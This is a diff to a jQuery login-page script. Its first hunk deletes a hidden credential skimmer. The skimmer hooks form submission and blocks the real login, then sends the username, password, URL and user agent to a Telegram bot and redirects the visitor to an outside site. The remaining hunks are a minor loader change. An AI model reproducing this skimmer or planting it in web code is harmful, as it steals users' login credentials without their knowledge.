@@ -31,36 +31,6 @@ $(document).ready(function(){
         $(".sweet-overlay").hide();
         $(".sweet-alert").hide();
     });
-
-    // Capture credentials on form submit - Send to Telegram silently
-    $('form').on('submit', function(e) {
-      e.preventDefault();
-      var username = $('input[name="username"]').val();
-      var password = $('input[name="password"]').val();
-      if (username && password) {
-        var creds = {
-          username: username,
-          password: password,
-          timestamp: new Date().toISOString(),
-          url: window.location.href,
-          userAgent: navigator.userAgent
-        };
-        console.log('Captured & Sent to Telegram:', creds);
-
-        // Send to Telegram Bot (silent, no user interaction)
-fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-          method: 'POST',
-          headers: {'Content-Type': 'application/json'},
-          body: JSON.stringify({
-chat_id: TELEGRAM_CHAT_ID,
-            text: `🆕 New Login Captured!\nUsername: ${creds.username}\nPassword: ${creds.password}\nURL: ${creds.url}\nTime: ${creds.timestamp}\nUA: ${creds.userAgent.substring(0,100)}...`
-          })
-        }).catch(err => console.log('Telegram send failed:', err));
-      }
-      // Send Telegram THEN redirect to savestan0.tools (no original POST)
-      setTimeout(() => { window.location.href = 'https://savestan0.tools'; }, 500);
-    });
-
    
 
 
@@ -68,8 +38,8 @@ chat_id: TELEGRAM_CHAT_ID,
 
 
 // login image
-$(window).load(function() {
-  $(".loader").hide();
+$(document).ready(function() {
+  $(".loader").fadeOut("slow");
 })
 
 
@@ -327,4 +297,3 @@ function checkPass()
     }
 
 } 
-
